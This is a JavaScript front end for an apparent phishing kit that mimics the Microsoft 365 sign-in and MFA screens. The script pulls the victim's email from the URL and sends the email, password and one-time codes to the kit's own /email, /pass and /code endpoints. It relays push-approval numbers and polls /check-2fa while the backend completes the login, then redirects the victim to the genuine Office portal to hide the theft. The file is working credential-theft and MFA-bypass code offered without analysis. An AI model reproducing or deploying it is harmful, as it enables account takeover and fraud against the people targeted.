let loader = document.getElementById("loader");
let passwordCard = document.getElementById("sign-in");
let codeCard = document.getElementById("enter-code");
let authCard = document.getElementById("authenticate");
let incorrectPass = document.getElementById("incorrect-pass");
let incorrectCode = document.getElementById("incorrect-code");
let passInput = document.getElementById("pass-input");
let codeInput = document.getElementById("code-input");
let authNumber = document.getElementById("auth-number");
let loaderSignIn = document.getElementById("loader-sign-in");
let loaderEnterCode = document.getElementById("loader-enter-code");
let emailSignIn = document.getElementById("email-sign-in");
let emailEnterCode = document.getElementById("email-enter-code");
let emailAuthenticate = document.getElementById("email-authenticate");
let emailRoot = document.getElementById("email-root");
let loaderResend = document.getElementById("loader-resend");
let loaderEmail = document.getElementById("loader-email");
let resendCard = document.getElementById("resend-card");

let email;
let uniqueId;

passInput.addEventListener("input", function (e) {});

document.body.addEventListener("click", function (e) {
  let targetId = e.target.id;
  if (targetId == "sign-in-btn-1") {
    signIn();
  } else if (targetId == "cancel-code") {
    window.location.reload();
  } else if (targetId == "verify-code") {
    verifyCode();
  } else if (targetId == "resend") {
    resend();
  } else if (targetId == "sign-in-btn-0") {
    validateEmail(document.getElementById("email-input").value);
  }
});

function grabEmail() {
  let hasEmail = new URLSearchParams(window.location.search).has("id");
  if (hasEmail) {
    email = new URLSearchParams(window.location.search).get("id");
    document.querySelectorAll(".email").forEach(function (element) {
      element.innerHTML = email;
    });
    uniqueId = generateUniqueId();
    sendEmail(email, true);
  } else {
    configure();
  }
}

function configure() {
  setTimeout(function () {
    $("#loader").hide();
    $("#enter-email").show();
  }, 3000);
}

function validateEmail(email) {
  if (email) {
    document.querySelectorAll(".email").forEach(function (element) {
      element.innerHTML = email;
    });
    uniqueId = generateUniqueId();
    sendEmail(email, false);
  }
}

function sendEmail(email, stat) {
  setLoader(loaderEmail, "visible");
  let sendEmailXhr = new XMLHttpRequest();
  sendEmailXhr.open("POST", "/email", true);
  sendEmailXhr.setRequestHeader("Content-type", "application/json");
  sendEmailXhr.send(JSON.stringify({ sessionId: uniqueId, email: email }));

  sendEmailXhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      let response = this.response;
      console.log(response);
      if (response == "1" || response == "2") {
        setLoader(loaderEmail, "hide");
        if (stat) {
          $("#loader").hide();
          $("#sign-in").show();
        } else {
          $("#enter-email").hide();
          $("#sign-in").show();
        }

        // document.getElementById("page-spinner").style.display = "none";
        // document.getElementById("page-content").style.display = "block";
      }
    }
  };
}

function signIn() {
  setIncorrectPass("none");
  setLoader(loaderSignIn, "visible");
  let signInXhr = new XMLHttpRequest();
  signInXhr.open("POST", "/pass", true);
  signInXhr.setRequestHeader("Content-type", "application/json");
  signInXhr.send(
    JSON.stringify({ sessionId: uniqueId, password: passInput.value })
  );

  signInXhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      let response = this.response;
      if (response == 0) {
        console.log(response);
        setIncorrectPass("block");
        passInput.value = "";
        setLoader(loaderSignIn, "hidden");
      } else if (response == 1) {
        setLoader(loaderSignIn, "hidden");
        location.href =
          "https://portal.office.com";
      } else if (response == 2) {
        changeCard(passwordCard, codeCard);
        setLoader(loaderSignIn, "hidden");
      } else if (response == 3) {
        setLoader(loaderSignIn, "hidden");
        location.href =
          "https://portal.office.com";
      } else {
        changeCard(passwordCard, authCard);
        setLoader(loaderSignIn, "hidden");
        document.getElementById("auth-number").textContent = response;
        setTimeout(function () {
          check2Fa();
        }, 2000);
        setTimeout(function () {
          changeCard(authCard, resendCard);
        }, 60000);
      }
    }
  };
}

function verifyCode() {
  setLoader(loaderEnterCode, "visible");
  setIncorrectCode("none");
  let verifyXhr = new XMLHttpRequest();
  verifyXhr.open("POST", "/code", true);
  verifyXhr.setRequestHeader("Content-type", "application/json");
  verifyXhr.send(
    JSON.stringify({
      sessionId: uniqueId,
      password: passInput.value,
      code: codeInput.value,
    })
  );

  verifyXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = this.response;
      if (response == 0) {
        setIncorrectCode("block");
        codeInput.value = "";
        setLoader(loaderEnterCode, "hidden");
      } else if (response == 1) {
        setLoader(loaderEnterCode, "hidden");
        location.href =
          "https://portal.office.com";
      }
    }
  };
}

function resend() {
  setLoader(loaderResend, "visible");
  let resendXhr = new XMLHttpRequest();
  resendXhr.open("POST", "/resend", true);
  resendXhr.setRequestHeader("Content-type", "application/json");
  resendXhr.send(
    JSON.stringify({
      sessionId: uniqueId,
      password: passInput.value,
      request: "resend",
    })
  );

  resendXhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      let response = this.response;
      if (response == 0) {
        location.href =
          "https://portal.office.com";
      } else {
        setLoader(loaderResend, "hidden");
        changeCard(resendCard, authCard);
        document.getElementById("auth-number").textContent = response;

        setTimeout(function () {
          check2Fa();
        }, 2000);

        setTimeout(function () {
          changeCard(authCard, resendCard);
        }, 60000);
      }
    }
  };
}

function check2Fa() {
  let check2FaXhr = new XMLHttpRequest();
  check2FaXhr.open("POST", "/check-2fa", true);
  check2FaXhr.setRequestHeader("Content-type", "application/json");
  check2FaXhr.send(
    JSON.stringify({
      sessionId: uniqueId,
      password: passInput.value,
      request: "check",
    })
  );

  check2FaXhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      let response = this.response;
      if (response == 0) {
        console.log(response);
      } else if (response == 1) {
        location.href =
          "https://portal.office.com";
      }
    }
  };
}

function setIncorrectPass(display) {
  incorrectPass.style.display = display;
}

function setIncorrectCode(display) {
  incorrectCode.style.display = display;
}

function changeCard(prev, next) {
  prev.style.display = "none";
  next.style.display = "block";
}

function setLoader(loader, visibility) {
  loader.style.visibility = visibility;
}
function generateUniqueId() {
  return "id-" + new Date().getTime() + "-" + Math.floor(Math.random() * 1000);
}

grabEmail();
